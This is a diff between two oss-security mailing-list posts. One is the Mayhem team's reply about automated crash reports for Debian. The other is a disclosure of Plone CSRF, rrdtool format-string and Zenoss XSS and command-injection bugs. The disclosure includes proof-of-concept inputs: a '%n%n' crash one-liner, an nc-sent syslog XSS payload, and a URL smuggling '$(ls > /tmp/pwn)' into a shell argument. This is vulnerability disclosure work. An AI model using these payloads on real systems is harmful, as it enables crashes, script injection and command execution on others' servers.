@@ -1,48 +1,46 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/06/28/1
-Message-ID: <CAF1AS2jfWUSsWW=+WPKT_3oTWTX28-KJD+z22LxSw-TMDwXcsw@mail.gmail.com>
-Date: Thu, 27 Jun 2013 23:04:58 -0400
-From: Alexandre Rebert <alexandre.rebert@...il.com>
-To: coley@...re.org
-Cc: oss-security@...ts.openwall.com, kseifried@...hat.com,  Russ Allbery <rra@...nford.edu>, cve-assign@...re.org
-Subject: Re: 1.2k bug reports for Debian, some may be security
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/04/18/5
+Message-ID: <CAN00zFDemB78NwGXC1qTU9hCpW9Cv4MVtM7dCJ5KfCoxA3eMfA@mail.gmail.com>
+Date: Thu, 18 Apr 2013 14:05:42 +0200
+From: Thomas Pollet <thomas.pollet@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: plone, rrdtool, zenoss bugs
 Content-Type: text/plain; charset=utf-8
 
 Hi,
 
-I can confirm most of the bugs have no security implications, and
-should probably not get CVEs. Given the high number of crashes we
-found, it is highely likely that some will impact security though.
+I reported a csrf bug in plone pluggable authentication service, fixed in
+4.2.5
+http://plone.org/products/plone/releases/4.2.5
+" CSRF protection for the ZODBUserManager, ZODBGroupManager,
+ZODBRoleManger, and DynamicGroupsPlugin plugins."
 
-Mayhem considered multiple input sources during the analysis of the
-23K binaries: environment variables, command line arguments, files and
-standard input. Sockets was not one of them. That means that we only
-need to consider two attack vectors: (1) crashes of setuid/setgid
-programs, and (2) crashes with input files that are potentially
-untrusted.
 
-For (1), I have not checked whether we found crashes in setuid/setgid
-programs yet. It is however straightforward to compile a list and
-forward it to whoever is filing the CVEs. They might not be
-exploitable, but a crash in such programs is concerning and might be
-worth a CVE. Let me know if that's something you'd like us to do.
+Also,
+the rrdtool python module crashes on format string exploit
+$ python -c "import rrdtool
+rrdtool.graph('/tmp/out.png','-f','%n%n')"
+Segmentation fault
 
-For (2), it is difficult to automatically identify such crashes. As
-Steve mentioned, it may require a deep familiarity with the program.
-Package maintainers or upstream developers are the most suited people
-to judge whether a crash should be considered security critical. It is
-an unsatisfying solution, as the burden to report vulnerabilities
-would lie on them, but I don't see a way around it.
+this module is used by zenoss to create graphs (zenoss users are able to
+pass arguments to rrdtool).
 
-> I was under the impression from an incomplete read of the MAYHEM paper that
-> it could generate shellcode for code execution, yet I'm only hearing of
-> reports for crashes.  If code execution can be proven, then that may be
-> informative.
+On zenoss, I reported some bugs to them (and to this list) which have been
+fixed in the latest release (4.2.3). for example, zenoss displayed syslog
+and snmp input without filtering html characters which results in xss.
 
-Yes, that is correct. Mayhem actually generated a couple of exploits
-from the crashes we found. We are currently looking at them
-individually, and we will report all exploits that are security
-issues.
+example syslog exploit :
+echo '<130>' Aug 29 07:17:34 test '<xss>' | nc -u zenoss 514
 
-Regards,
-The Mayhem Team
+another bug was that the test_datasource feature doesn't escape the snmp
+oid which is passed by zenoss to the shell as an argument for the snmpwalk
+command
+example: https://
+[ZENOSS_HOST]/zport/dmd/Devices/rrdTemplates/Device/datasources/sysUpTime/test_datasource?data={%22newId%22:%22DetectedVirus%22,%22oid%22:%22$%28ls%20%3E%20/tmp/pwn%29%22,%22enabled%22:%22on%22,%22testDevice%22:%22127.0.0.1%22,%22uid%22:%22%22}
+
+http://jira.zenoss.com/jira/browse/ZEN-3183
+
+
+Cheers,
+T
+
